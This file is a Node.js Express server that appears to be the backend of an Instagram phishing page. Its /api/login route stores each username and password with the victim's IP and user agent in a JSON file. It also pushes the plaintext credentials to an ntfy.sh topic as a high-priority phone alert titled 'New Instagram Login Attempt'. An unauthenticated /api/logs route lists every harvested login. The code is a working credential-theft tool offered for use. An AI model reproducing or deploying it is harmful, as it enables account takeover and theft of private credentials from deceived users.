require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const NTFY_TOPIC = process.env.NTFY_TOPIC || 'my-logins-change-this-secret-topic-2024';
const NTFY_SERVER = process.env.NTFY_SERVER || 'https://ntfy.sh';
const DB_PATH = process.env.DB_PATH || './logins.json';
const os = require('os');

const networkInterfaces = os.networkInterfaces();

for (const interfaceName in networkInterfaces) {
  for (const net of networkInterfaces[interfaceName]) {
    if (net.family === 'IPv4' && !net.internal) {
      console.log(`Network: http://${net.address}:3000`);
    }
  }
}
function loadDB() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify({ logins: [] }, null, 2));
  }
  return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
}

function saveDB(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function insertLogin(identifier, password, ip, ua) {
  const db = loadDB();
  const entry = {
    id: db.logins.length + 1,
    identifier,
    password,
    ip_address: ip,
    user_agent: ua,
    logged_at: new Date().toISOString(),
  };
  db.logins.push(entry);
  saveDB(db);
  return entry;
}

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
// app.use(cors());
// app.use(express.json());
// app.use(express.urlencoded({ extended: true }));
// app.use(express.static(__dirname));

async function sendPhoneNotification(identifier, password, ip) {
  try {
    const body = `User: ${identifier}\nPass: ${password}\nIP: ${ip}`;
    await fetch(`${NTFY_SERVER}/${NTFY_TOPIC}`, {
      method: 'POST',
      headers: {
        'Title': 'New Instagram Login Attempt',
        'Priority': 'high',
        'Tags': 'key,instagram',
        'Content-Type': 'text/plain',
      },
      body,
    });
    console.log('[ntfy] Notification sent');
  } catch (err) {
    console.error('[ntfy] Failed:', err.message);
  }
}

app.post('/api/login', async (req, res) => {
  const { identifier, password } = req.body;
  if (!identifier || !password) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  try {
    const entry = insertLogin(identifier.trim(), password, ip, ua);
    console.log(`[DB] Saved #${entry.id}: ${identifier}`);
  } catch (err) {
    console.error('[DB] Error:', err.message);
  }
  sendPhoneNotification(identifier.trim(), password, ip);
  // return res.json({
  //   success: false,
  //   message: 'Sorry, your password was incorrect. Please double-check your password.',
  // });
  return res.json({
   success: true
});
});

app.get('/api/logs', (req, res) => {
  try {
    const db = loadDB();
    res.json({ count: db.logins.length, logins: db.logins });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
// app.get('*', (req, res) => {
//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.listen(PORT, () => {
//   console.log(`\nServer: http://localhost:${PORT}`);
//   console.log(`Notifications: ${NTFY_SERVER}/${NTFY_TOPIC}`);
//   console.log(`Logs: http://localhost:${PORT}/api/logs\n`);
// });
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server: http://0.0.0.0:${PORT}`);
  console.log(`Notifications: ${NTFY_SERVER}/${NTFY_TOPIC}`);
  console.log(`Logs: http://0.0.0.0:${PORT}/api/logs`);
});